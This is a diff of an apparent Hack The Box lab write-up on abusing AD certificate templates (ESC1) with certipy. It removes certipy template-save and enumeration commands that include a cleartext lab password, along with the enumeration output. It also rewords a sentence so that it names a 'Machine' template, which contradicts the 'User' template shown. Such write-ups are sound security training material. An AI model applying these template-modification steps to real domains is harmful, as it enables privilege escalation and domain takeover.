@@ -943,64 +943,13 @@ So with these two user accounts i can create computer accounts under a certain O
 So the plan here is to simply make a copy of an existing template then use certipy to save it to a json file, then modify this json file to fit the requirements of ESC1 then write this new json file to the CA as a new template, then ill just abuse ESC1
 
 ```python
-❯❯❯ certipy-ad template -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -template User -save-configuration User.json
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
-[*] Saving current configuration to 'User.json'
-[*] Wrote current configuration for 'User' to 'User.json'
 ```
 
 First ill save the template to a json file
 
 ```python
-❯❯❯ certipy-ad find -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -enabled -stdout
 
-11
-    Template Name                       : User
-    Display Name                        : User
-    Certificate Authorities             : coder-DC01-CA
-    Enabled                             : True
-    Client Authentication               : True
-    Enrollment Agent                    : False
-    Any Purpose                         : False
-    Enrollee Supplies Subject           : False
-    Certificate Name Flag               : SubjectAltRequireUpn
-                                          SubjectAltRequireEmail
-                                          SubjectRequireEmail
-                                          SubjectRequireDirectoryPath
-    Enrollment Flag                     : IncludeSymmetricAlgorithms
-                                          PublishToDs
-                                          AutoEnrollment
-    Private Key Flag                    : ExportableKey
-    Extended Key Usage                  : Encrypting File System
-                                          Secure Email
-                                          Client Authentication
-    Requires Manager Approval           : False
-    Requires Key Archival               : False
-    Authorized Signatures Required      : 0
-    Schema Version                      : 1
-    Validity Period                     : 1 year
-    Renewal Period                      : 6 weeks
-    Minimum RSA Key Length              : 2048
-    Template Created                    : 2022-06-29T04:01:44+00:00
-    Template Last Modified              : 2022-06-29T04:01:44+00:00
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights               : CODER.HTB\Domain Admins
-                                          CODER.HTB\Domain Users
-                                          CODER.HTB\Enterprise Admins
-      Object Control Permissions
-        Owner                           : CODER.HTB\Enterprise Admins
-        Full Control Principals         : CODER.HTB\Domain Admins
-                                          CODER.HTB\Enterprise Admins
-        Write Owner Principals          : CODER.HTB\Domain Admins
-                                          CODER.HTB\Enterprise Admins
-        Write Dacl Principals           : CODER.HTB\Domain Admins
-                                          CODER.HTB\Enterprise Admins
-        Write Property Enroll           : CODER.HTB\Domain Admins
-                                          CODER.HTB\Domain Users
-                                          CODER.HTB\Enterprise Admins
-    [+] User Enrollable Principals      : CODER.HTB\Domain Users
 ```
 
 if i look at the current settings on the template and compare them with the requirements for ESC1 i only to change one thing
@@ -1013,7 +962,7 @@ The following are the requirements for ESC1:
 - Requires Management Approval: False (already set)
 - Authorized Signatures Required: 0 (already set)
 
-Another thins is that the compromised user must be able to enroll, but this `user` template allows all domain users to enroll so this is also already set
+Another thins is that the compromised user must be able to enroll, but this `Machine` template allows all domain computers to enroll so this is also already set
 
 After some research i find the attribute that controls the `Enrollee Supplies Subject` is `"msPKI-Certificate-Name-Flag": -1509949440`
 
